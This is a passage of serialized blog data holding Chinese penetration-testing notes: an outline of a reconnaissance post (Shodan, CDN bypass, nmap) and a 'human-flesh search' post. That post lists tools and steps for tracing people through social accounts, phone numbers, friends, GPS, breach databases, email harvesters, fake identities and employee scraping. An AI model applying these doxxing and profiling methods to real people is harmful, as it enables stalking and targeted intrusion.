&lt;/a&gt;\n&lt;/div&gt;\n&lt;/li&gt;\n&lt;/ul&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;前言&quot;],&quot;text&quot;:[0,&quot;前言&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;在线搜索shodan&quot;],&quot;text&quot;:[0,&quot;在线搜索（Shodan）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;shodan工作原理&quot;],&quot;text&quot;:[0,&quot;Shodan工作原理&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;shodan的使用&quot;],&quot;text&quot;:[0,&quot;Shodan的使用&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用搜索过滤&quot;],&quot;text&quot;:[0,&quot;使用搜索过滤&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;kali中安装-shodan&quot;],&quot;text&quot;:[0,&quot;Kali中安装 Shodan&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;kali中shodan的使用&quot;],&quot;text&quot;:[0,&quot;Kali中Shodan的使用&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;msf中使用shodan&quot;],&quot;text&quot;:[0,&quot;MSF中使用Shodan&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;域名信息收集&quot;],&quot;text&quot;:[0,&quot;域名信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;通过域名查询ip&quot;],&quot;text&quot;:[0,&quot;通过域名查询IP&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;查询网站&quot;],&quot;text&quot;:[0,&quot;查询网站&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;什么是cdn&quot;],&quot;text&quot;:[0,&quot;什么是CDN&quot;]}],[0,{&quot;depth&quot;:[0,4],&quot;slug&quot;:[0,&quot;2113-cdn的优势&quot;],&quot;text&quot;:[0,&quot;2.1.1.3 CDN的优势&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;几种访问方式的不同&quot;],&quot;text&quot;:[0,&quot;几种访问方式的不同&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;cdn的配置&quot;],&quot;text&quot;:[0,&quot;CDN的配置&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;绕过cdn的方法&quot;],&quot;text&quot;:[0,&quot;绕过CDN的方法&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;查询子域名&quot;],&quot;text&quot;:[0,&quot;查询子域名&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;查询主域名&quot;],&quot;text&quot;:[0,&quot;查询主域名&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;邮件服务器&quot;],&quot;text&quot;:[0,&quot;邮件服务器&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;查看域名历史解析记录&quot;],&quot;text&quot;:[0,&quot;查看域名历史解析记录&quot;]}],[0,{&quot;depth&quot;:[0,4],&quot;slug&quot;:[0,&quot;国外访问&quot;],&quot;text&quot;:[0,&quot;国外访问&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;nslookup查询&quot;],&quot;text&quot;:[0,&quot;Nslookup查询&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;网站漏洞&quot;],&quot;text&quot;:[0,&quot;网站漏洞&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;censys查询ssl证书找到真实ip&quot;],&quot;text&quot;:[0,&quot;Censys查询SSL证书找到真实IP&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;域名的whois信息&quot;],&quot;text&quot;:[0,&quot;域名的whois信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;公司敏感信息收集&quot;],&quot;text&quot;:[0,&quot;公司敏感信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;github的搜索&quot;],&quot;text&quot;:[0,&quot;Github的搜索&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用-github-进行邮件配置信息收集&quot;],&quot;text&quot;:[0,&quot;使用 Github 进行邮件配置信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用github进行数据库信息收集&quot;],&quot;text&quot;:[0,&quot;使用Github进行数据库信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用github进行-svn-信息收集&quot;],&quot;text&quot;:[0,&quot;使用Github进行 SVN 信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用github进行综合信息收集&quot;],&quot;text&quot;:[0,&quot;使用Github进行综合信息收集&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;网站指纹识别&quot;],&quot;text&quot;:[0,&quot;网站指纹识别&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;整站分析&quot;],&quot;text&quot;:[0,&quot;整站分析&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;服务器类型linuxwindows&quot;],&quot;text&quot;:[0,&quot;服务器类型（Linux/windows）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;网站容器apachenginxtomcatiis&quot;],&quot;text&quot;:[0,&quot;网站容器（Apache/Nginx/Tomcat/IIS）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;脚本类型phpjspaspaspx&quot;],&quot;text&quot;:[0,&quot;脚本类型（php/jsp/asp/aspx）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;数据库类型mysqloracleaccesssqlserver&quot;],&quot;text&quot;:[0,&quot;数据库类型（Mysql/Oracle/Access/SQLserver）&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;第六章主机扫描&quot;],&quot;text&quot;:[0,&quot;第六章主机扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;第七章端口扫描nmap&quot;],&quot;text&quot;:[0,&quot;第七章端口扫描（nmap）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;nmap简介&quot;],&quot;text&quot;:[0,&quot;nmap简介&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;nmap基本功能&quot;],&quot;text&quot;:[0,&quot;nmap基本功能&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;探测目标主机是否在线&quot;],&quot;text&quot;:[0,&quot;探测目标主机是否在线&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;当探测公网ip时&quot;],&quot;text&quot;:[0,&quot;当探测公网IP时&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;当探测内网ip时&quot;],&quot;text&quot;:[0,&quot;当探测内网IP时&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;722-端口扫描及原理&quot;],&quot;text&quot;:[0,&quot;7.2.2 端口扫描及原理&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;原理&quot;],&quot;text&quot;:[0,&quot;原理&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;简单扫描nmap-ip&quot;],&quot;text&quot;:[0,&quot;简单扫描（nmap ip）&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;全面扫描nmap--a-ip&quot;],&quot;text&quot;:[0,&quot;全面扫描(nmap -A ip)&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;探测指定端口的开放状态&quot;],&quot;text&quot;:[0,&quot;探测指定端口的开放状态&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;723-版本侦测&quot;],&quot;text&quot;:[0,&quot;7.2.3 版本侦测&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;原理-1&quot;],&quot;text&quot;:[0,&quot;原理&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;用法&quot;],&quot;text&quot;:[0,&quot;用法&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;724-os侦测&quot;],&quot;text&quot;:[0,&quot;7.2.4 OS侦测&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;原理-2&quot;],&quot;text&quot;:[0,&quot;原理&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;用法-1&quot;],&quot;text&quot;:[0,&quot;用法&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;73-nmap高级功能&quot;],&quot;text&quot;:[0,&quot;7.3 nmap高级功能&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;731-防火墙ids规避&quot;],&quot;text&quot;:[0,&quot;7.3.1 防火墙/IDS规避&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;nse脚本引擎&quot;],&quot;text&quot;:[0,&quot;NSE脚本引擎&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;分类扫描&quot;],&quot;text&quot;:[0,&quot;分类扫描&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;应用扫描&quot;],&quot;text&quot;:[0,&quot;应用扫描&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;常见危险端口对应的服务&quot;],&quot;text&quot;:[0,&quot;常见危险端口对应的服务&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;网站敏感目录和文件&quot;],&quot;text&quot;:[0,&quot;网站敏感目录和文件&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;dirbuster&quot;],&quot;text&quot;:[0,&quot;dirbuster&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;旁站和c段扫描&quot;],&quot;text&quot;:[0,&quot;旁站和C段扫描&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1.png&quot;],[0,&quot;img/2.png&quot;],[0,&quot;img/3.png&quot;],[0,&quot;img/4.png&quot;],[0,&quot;img/5.png&quot;],[0,&quot;img/6.png&quot;],[0,&quot;img/7.png&quot;],[0,&quot;img/8.png&quot;],[0,&quot;img/9.png&quot;],[0,&quot;img/10.png&quot;],[0,&quot;img/11.png&quot;],[0,&quot;img/12.png&quot;],[0,&quot;img/13.png&quot;],[0,&quot;img/14.png&quot;],[0,&quot;img/16.png&quot;],[0,&quot;img/15.png&quot;],[0,&quot;img/17.png&quot;],[0,&quot;img/18.png&quot;],[0,&quot;img/19.png&quot;],[0,&quot;img/20.png&quot;],[0,&quot;img/21.png&quot;],[0,&quot;img/22.jpg&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;信息收集&quot;],&quot;date&quot;:[3,&quot;2023-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1.png&quot;],[0,&quot;img/2.png&quot;],[0,&quot;img/3.png&quot;],[0,&quot;img/4.png&quot;],[0,&quot;img/5.png&quot;],[0,&quot;img/6.png&quot;],[0,&quot;img/7.png&quot;],[0,&quot;img/8.png&quot;],[0,&quot;img/9.png&quot;],[0,&quot;img/10.png&quot;],[0,&quot;img/11.png&quot;],[0,&quot;img/12.png&quot;],[0,&quot;img/13.png&quot;],[0,&quot;img/14.png&quot;],[0,&quot;img/16.png&quot;],[0,&quot;img/15.png&quot;],[0,&quot;img/17.png&quot;],[0,&quot;img/18.png&quot;],[0,&quot;img/19.png&quot;],[0,&quot;img/20.png&quot;],[0,&quot;img/21.png&quot;],[0,&quot;img/22.jpg&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/6&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/人网搜索&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;人肉搜索&quot;],&quot;date&quot;:[3,&quot;2022-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 人肉搜索\n\n**社交**\n\n```\nQQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛\n外网信息\n有些人喜欢把自己的生活传到外网\n推特、ins、fb等\n微信号\n某些人昵称包含姓名缩写，生日等。\n全网用同一个网名、头像\n手机号查询注册过的网站 https://www.reg007.com/\n从好友入手，找到目标亲密的人\n手机添加到手机通讯录，登录一些APP时会提醒你关注\n```\n手机号加入通讯录匹配各个APP用户信息\n\n注册过的网站\n```\nhttps://www.reg007.com/\nhttps://www.usersearch.org/\n```\n\n目标人员的兴趣\n\n```\n目标人员的兴趣 注册过的小众论坛，站点\n针对此类站点的深入\n收集到的用户名，电话等信息生成字典\n```\n\n邮箱搜集与验证\n\n```\nChrome插件 查找网页暴露邮箱 https://hunter.io/chrome\nhttps://souyouxiang.com/find-contact/ 邮箱域名搜索\nhttps://github.com/killswitch-GUI/SimplyEmail\nhttps://tools.verifyemailaddress.io/\nhttps://github.com/maldevel/EmailHarvester \n  python3 EmailHarvester.py -d google.com -e all \nhttps://github.com/m4ll0k/infoga \n  python3 infoga.py --domain vmware.com --source all \nhttps://www.skymem.info/ 邮箱地址搜索\n```\n\nExchange\n\n```\nhttps://github.com/dafthack/MailSniper\n```\n\n历史泄露过的资料等\n\n```\n库\nhttps://intelx.io/ \nhttps://weleakinfo.to/ \nhttps://haveibeenpwned.com/\nhttps://github.com/kernelmachine/haveibeenpwned\nhttps://www.dehashed.com/ \n  python3 dehashed.py -o -d domain.com -a API-KEY -u user@domain.com\n```\n\nGPS查询\n\n```\nhttps://www.opengps.cn/Default.aspx\n```\n\n默认密码\n\n```\nhttps://default-password.info/\nhttp://routerpasswords.com\n```\n\n如需注册\n\n```\nSms\nhttps://www.materialtools.com/\nhttp://receivefreesms.com/\nEmail\nhttps://10minutemail.net/\nhttps://zh.mytrashmailer.com/\nhttp://24mail.chacuo.net/enus\nhttps://www.linshiyouxiang.net/\nFake id\nhttps://www.fakenamegenerator.com/\nhttp://www.haoweichi.com/\nhttps://www.fakeaddressgenerator.com/\n```\n\n\n企业信息\n\n```\n天眼查、企查查、企业信用信息公示系统\n企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计\n员工姓名\n从LinkedIn中提取所有员工\nhttps://github.com/ChrisAD/linkedin-employee-scraper\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/人网搜索.md&quot;],&quot;digest&quot;:[0,&quot;477f900264dd6af9&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;人肉搜索\&quot;&gt;人肉搜索&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#人肉搜索\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;社交&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;外网信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;有些人喜欢把自己的生活传到外网&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;推特、ins、fb等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;微信号&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;某些人昵称包含姓名缩写，生日等。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;全网用同一个网名、头像&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;手机号查询注册过的网站 https://www.reg007.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;从好友入手，找到目标亲密的人&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;手机添加到手机通讯录，登录一些APP时会提醒你关注&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;手机号加入通讯录匹配各个APP用户信息&lt;/p&gt;\n&lt;p&gt;注册过的网站&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.reg007.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.usersearch.org/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;目标人员的兴趣&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;目标人员的兴趣 注册过的小众论坛，站点&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;针对此类站点的深入&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;收集到的用户名，电话等信息生成字典&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;邮箱搜集与验证&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Chrome插件 查找网页暴露邮箱 https://hunter.io/chrome&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://souyouxiang.com/find-contact/ 邮箱域名搜索&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/killswitch-GUI/SimplyEmail&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://tools.verifyemailaddress.io/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/maldevel/EmailHarvester &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  python3 EmailHarvester.py -d google.com -e all &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/m4ll0k/infoga &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  python3 infoga.py --domain vmware.com --source all &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.skymem.info/ 邮箱地址搜索&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Exchange&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/dafthack/MailSniper&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;历史泄露过的资料等&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;库&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://intelx.io/ &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://weleakinfo.to/ &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://haveibeenpwned.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/kernelmachine/haveibeenpwned&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.dehashed.com/ &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  python3 dehashed.py -o -d domain.com -a API-KEY -u user@domain.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;GPS查询&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.opengps.cn/Default.aspx&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;默认密码&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://default-password.info/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://routerpasswords.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;如需注册&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Sms&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.materialtools.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://receivefreesms.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Email&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://10minutemail.net/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://zh.mytrashmailer.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://24mail.chacuo.net/enus&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.linshiyouxiang.net/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Fake id&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.fakenamegenerator.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://www.haoweichi.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.fakeaddressgenerator.com/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;企业信息&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;天眼查、企查查、企业信用信息公示系统&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;员工姓名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;从LinkedIn中提取所有员工&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/ChrisAD/linkedin-employee-scraper&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;人肉搜索&quot;],&quot;text&quot;:[0,&quot;人肉搜索&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;人肉搜索&quot;],&quot;date&quot;:[3,&quot;2022-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/2&quot;]}]]],&quot;currentPostSlug&quot;:[0,&quot;penetration/google-hacking&quot;],&quot;prevPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/一些情报源&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;一些情报源&quot;],&quot;date&quot;:[3,&quot;2026-01-18T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 云信息\n```\nAliyun、AWS、GCP、Azure等\n查找可公开访问的实例\nhttps://github.com/gwen001/s3-buckets-finder\nhttps://github.com/nccgroup/aws-inventory\nhttps://github.com/jordanpotti/AWSBucketDump\n```\n# APP反编译\n```\nurl、js、osskey、api等信息查找\n搜集到接口Fuzz常见参数\n```\n# C段/B段信息\n```\nBanner、是否存在目标的后台或其他入口/其他业务系统\n```\n# 工具\n```\nrecon-ng,theharvester,maltego,exiftool等\nhttps://www.spiderfoot.net/\nhttps://github.com/smicallef/spiderfoot\n```\n# 网页缓存\n```\nhttp://www.cachedpages.com/\nhttps://archive.org/web\n```\n# 